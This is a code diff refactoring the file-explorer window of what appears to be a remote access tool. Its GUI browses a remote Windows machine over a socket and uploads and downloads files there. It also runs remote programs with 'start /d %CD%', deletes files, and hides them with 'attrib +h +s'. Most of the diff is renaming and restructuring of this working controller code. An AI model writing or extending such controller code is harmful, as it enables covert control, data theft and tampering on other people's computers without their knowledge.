@@ -9,8 +9,8 @@ import socket
 import os
 from libs.modechat import get, send
 
-class mainPopup(QWidget, Ui_Form):
 
+class mainPopup(QWidget, Ui_Form):
     def __init__(self, args):
         QWidget.__init__(self)
         self.setupUi(self)
@@ -36,69 +36,65 @@ class mainPopup(QWidget, Ui_Form):
         self.setWindowTitle('Remote File Explorer on - %s - Socket #%s' % (self.ipAddress, self.socket))
 
         # signals
-        self.upButton.clicked.connect(self.parentFolder)
-        self.explorerTable.doubleClicked.connect(self.openFolder)
-        self.explorerPathEntry.returnPressed.connect(self.openPath)
+        self.upButton.clicked.connect(self.parent_folder)
+        self.explorerTable.doubleClicked.connect(self.open_folder)
+        self.explorerPathEntry.returnPressed.connect(self.open_path)
         self.uploadButton.clicked.connect(self.upload)
         self.downloadButton.clicked.connect(self.download)
         self.cancelButton.clicked.connect(self.cancelProgress)
 
         # Initializing combobox change Event
-        self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.driveChange)
+        self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.drive_change)
 
         self.explorerTable.setContextMenuPolicy(Qt.CustomContextMenu)
-        self.connect(self.explorerTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.Menu)
+        self.connect(self.explorerTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.right_click_menu)
 
-        self.getRemoteContent()
+        self.get_content()
 
-    def Menu(self, point):
-        try:
+    def right_click_menu(self, point):
+        #try:
             _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
-            self.eMenu = QMenu(self)
+            self.emenu = QMenu(self)
 
             # File commands
             if '<FILE>' in _type:
-                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), 'Download', self.download)
-                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), 'Execute', self.executeFile)
+                self.emenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), 'Download', self.download)
+                self.emenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), 'Execute', self.execute_remotely)
 
             # Folder commands
             elif '<DIR>' in _type:
-                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), 'Open Folder', self.openFolder)
+                self.emenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), 'Open Folder', self.open_folder)
 
             # Global commands
-            self.hiddenMenu = QMenu(self.eMenu)
-            self.hiddenMenu.setTitle('Hidden attribute')
-            self.hiddenMenu.setIcon(QIcon(os.path.join(self.assets, 'hidden.png')))
-            self.eMenu.addMenu(self.hiddenMenu)
-            self.hiddenMenu.addAction(QIcon(os.path.join(self.assets, 'hidden.png')), 'Hide', self.Hide)
-            self.hiddenMenu.addAction(QIcon(os.path.join(self.assets, 'unhide.png')), 'Unhide', self.Unhide)
-            self.eMenu.addSeparator()
-            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'remove.png')), 'Remove', self.Remove)
+            self.hidden_menu = QMenu(self.emenu)
+            self.hidden_menu.setTitle('Hidden attribute')
+            self.hidden_menu.setIcon(QIcon(os.path.join(self.assets, 'hidden.png')))
+            self.emenu.addMenu(self.hidden_menu)
+            self.hidden_menu.addAction(QIcon(os.path.join(self.assets, 'hidden.png')), 'Hide', self.hide)
+            self.hidden_menu.addAction(QIcon(os.path.join(self.assets, 'unhide.png')), 'Unhide', self.unhide)
+            self.emenu.addSeparator()
+            self.emenu.addAction(QIcon(os.path.join(self.assets, 'remove.png')), 'Remove', self.remove)
 
-            self.eMenu.exec_(self.explorerTable.mapToGlobal(point))
+            self.emenu.exec_(self.explorerTable.mapToGlobal(point))
 
-        except AttributeError:
-            pass
+        #except AttributeError:
+            #pass
 
-    def Unhide(self):
+    def unhide(self):
         _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
         get(self.sock, 'attrib -h -s {}'.format(_file), 'hide')
-        self.getRemoteContent()
+        self.get_content()
 
-    def Hide(self):
+    def hide(self):
         _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
         get(self.sock, 'attrib +h +s {}'.format(_file), 'unhide')
-        self.getRemoteContent()
+        self.get_content()
 
-
-    def executeFile(self):
+    def execute_remotely(self):
         _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
         data = get(self.sock, 'start /d %CD% {}'.format(_file), 'execute')
 
-    def openFolder(self):
-        self.openFolder()
-
-    def Remove(self):
+    def remove(self):
         try:
             _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
             _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
@@ -158,7 +154,7 @@ class mainPopup(QWidget, Ui_Form):
             end = '[ENDOFMESSAGE]'
             data = ''
 
-            send(self.sock, 'download '+_file)
+            send(self.sock, 'download ' + _file)
             try:
                 recv = str(self.sock.recv(1024))
                 if recv.isdigit():
@@ -169,7 +165,7 @@ class mainPopup(QWidget, Ui_Form):
                     while l:
                         self.gui()
                         data += l
-                        self.progressBar.setValue(len(data)*100/fileSize)
+                        self.progressBar.setValue(len(data) * 100 / fileSize)
                         if data.endswith(end):
                             break
                         if not self.activeProgress:
@@ -184,9 +180,9 @@ class mainPopup(QWidget, Ui_Form):
                 self.progressBar.setVisible(False)
                 self.cancelButton.setVisible(False)
                 self.tempBlockSignals(False)
-        #except AttributeError:
-            #warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
-            #warn.exec_()
+                # except AttributeError:
+                # warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
+                # warn.exec_()
 
     def upload(self):
         try:
@@ -205,7 +201,7 @@ class mainPopup(QWidget, Ui_Form):
                 fileSize = os.path.getsize(file_name)
                 uploadedSize = 0
 
-                send(self.sock, 'upload '+file_name)
+                send(self.sock, 'upload ' + file_name)
 
                 try:
                     with open(file_name, 'rb') as _f:
@@ -217,7 +213,7 @@ class mainPopup(QWidget, Ui_Form):
                             uploadedSize += len(data)
                             if data:
                                 self.sock.send(data)
-                                self.progressBar.setValue(uploadedSize*100/fileSize)
+                                self.progressBar.setValue(uploadedSize * 100 / fileSize)
                                 del data
                             else:
                                 self.sock.send(end)
@@ -237,10 +233,10 @@ class mainPopup(QWidget, Ui_Form):
             warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
             warn.exec_()
 
-    def getRemoteContent(self):
+    def get_content(self):
 
         def sizeof_fmt(num, suffix='B'):
-            for unit in ['','K','M','G','T','P','E','Z']:
+            for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
                 if abs(num) < 1024.0:
                     return "%3.1f%s%s" % (num, unit, suffix)
                 num /= 1024.0
@@ -260,113 +256,111 @@ class mainPopup(QWidget, Ui_Form):
         self.explorerTable.sortItems(0)
 
         try:
-            self.data = get(self.sock, 'ls', 'explorerContent')
+            data = get(self.sock, 'ls', 'explorerContent')
 
             # set remote path entry
-            content = ast.literal_eval(self.data)
+            content = ast.literal_eval(data)
+
+            self.explorerPathEntry.setText(content['path'])
+
+            # Get active drive caption
+            self.explorerDrivesDrop.setCurrentIndex(
+                self.explorerDrivesDrop.findText(content['path'].split('\\')[0], Qt.MatchFixedString))
+
+            # Turn combo signal off
+            self.comboInEditMode = False
+
+            # set tables row count
+            self.explorerTable.setRowCount(len(content) - 1)
+
+            # add content to table
+            for n, i in enumerate(content):
+
+                if i == 'path':
+                    continue
+
+                if content[int(i)]['hidden']:
+                    file_color = QColor(235, 235, 235)
+                    folder_color = QColor(201, 101, 101)
+                else:
+                    file_color = QColor('#9b59b6')
+                    folder_color = QColor(0, 255, 255)
+
+                # set content type
+                item = QTableWidgetItem('<FILE>') if content[i]['type'] else QTableWidgetItem('<DIR>')
+                if content[i]['type']:
+                    item.setTextColor(file_color)
+                    item.setSizeHint(QSize(50, 30))
+                else:
+                    item.setTextColor(folder_color)
+                    item.setSizeHint(QSize(50, 30))
+                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
+                self.explorerTable.setItem(n, 0, item)
+
+                # set content name
+                item = QTableWidgetItem(content[i]['name'])
+                if content[i]['type']:
+                    item.setTextColor(file_color)
+                    item.setIcon(QIcon(QPixmap(self.fileIcon)))
+                else:
+                    item.setTextColor(folder_color)
+                    item.setIcon(QIcon(QPixmap(self.folderIcon)))
+                self.explorerTable.setItem(n, 1, item)
+
+                # set content modified date
+                item = QTableWidgetItem(content[i]['modified'])
+                item.setTextAlignment(Qt.AlignCenter)
+                item.setSizeHint(QSize(220, 30))
+                self.explorerTable.setItem(n, 2, item)
+
+                # set file size
+                item = QTableWidgetItem(sizeof_fmt(content[i]['size'])) if content[i]['type'] else QTableWidgetItem('')
+                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+                item.setTextColor(file_color)
+                self.explorerTable.setItem(n, 3, item)
+
+            # update table
+            self.explorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)
+            self.explorerTable.resizeColumnsToContents()
+
         except (SyntaxError, ValueError):
             pass
 
-
-        self.explorerPathEntry.setText(content['path'])
-
-        # Get active drive caption
-        self.explorerDrivesDrop.setCurrentIndex(self.explorerDrivesDrop.findText(content['path'].split('\\')[0], Qt.MatchFixedString))
-
-
-        # Turn combo signal off
-        self.comboInEditMode = False
-
-        # set tables row count
-        self.explorerTable.setRowCount(len(content)-1)
-
-        # add content to table
-        for n, i in enumerate(content):
-            if i == 'path':
-                continue
-            try:
-                ext = content[i]['name'].split('.')[-1]
-            except Exception, e:
-                ext = ''
-
-            if content[i]['hidden']:
-                fileColor = QColor(235, 235, 235)
-                folderColor = QColor(201, 101, 101)
-            else:
-                fileColor = QColor('#9b59b6')
-                folderColor = QColor(0, 255, 255)
-
-            # set content type
-            item = QTableWidgetItem('<FILE>') if content[i]['type'] else QTableWidgetItem('<DIR>')
-            if content[i]['type']:
-                item.setTextColor(fileColor)
-                item.setSizeHint(QSize(50, 30))
-            else:
-                item.setTextColor(folderColor)
-                item.setSizeHint(QSize(50, 30))
-            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
-            self.explorerTable.setItem(n, 0, item)
-
-            # set content name
-            item = QTableWidgetItem(content[i]['name'])
-            if content[i]['type']:
-                item.setTextColor(fileColor)
-                item.setIcon(QIcon(QPixmap(self.fileIcon)))
-            else:
-                item.setTextColor(folderColor)
-                item.setIcon(QIcon(QPixmap(self.folderIcon)))
-            self.explorerTable.setItem(n, 1, item)
-
-            # set content modified date
-            item = QTableWidgetItem(content[i]['modified'])
-            item.setTextAlignment(Qt.AlignCenter)
-            item.setSizeHint(QSize(220, 30))
-            self.explorerTable.setItem(n, 2, item)
-
-            # set file size
-            item = QTableWidgetItem(sizeof_fmt(content[i]['size'])) if content[i]['type'] else QTableWidgetItem('')
-            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
-            item.setTextColor(fileColor)
-            self.explorerTable.setItem(n, 3, item)
-
-        # update table
-        self.explorerTable.resizeColumnsToContents()
-        self.explorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)
-
     # open parent folder
-    def parentFolder(self):
-        get(self.sock, 'cd ..', 'parentfolder')
-        self.getRemoteContent()
+    def parent_folder(self):
+        get(self.sock, 'cd ..', 'parentFolder')
+        self.get_content()
 
     # Change Drive
-    def driveChange(self):
+    def drive_change(self):
         if not self.comboInEditMode:
-            data = get(self.sock, 'cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())), 'drivechange')
+            data = get(self.sock, 'cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())),
+                       'drivechange')
             if 'Error opening directory' in data:
                 warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory', QMessageBox.Ok)
                 warn.exec_()
-            self.getRemoteContent()
+
+            self.get_content()
 
     # open remote folder
-    def openFolder(self):
+    def open_folder(self):
 
         # Get folder name
-        type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
-        name = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
+        _type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
+        _name = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
 
-        if '<DIR>' in type:
-
+        if '<DIR>' in _type:
             # Choose new folder
-            get(self.sock, 'cd %s' % name, 'choosefolder')
+            get(self.sock, 'cd %s' % _name, 'choosefolder')
 
             # Update table
-            self.getRemoteContent()
+            self.get_content()
 
     # open remote folder from path entry
-    def openPath(self):
+    def open_path(self):
         recv = get(self.sock, 'cd %s' % str(self.explorerPathEntry.text()), 'changepath')
         if 'Error opening directory' in recv:
             warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Path', QMessageBox.Ok)
             warn.exec_()
 
-        self.getRemoteContent()
+        self.get_content()
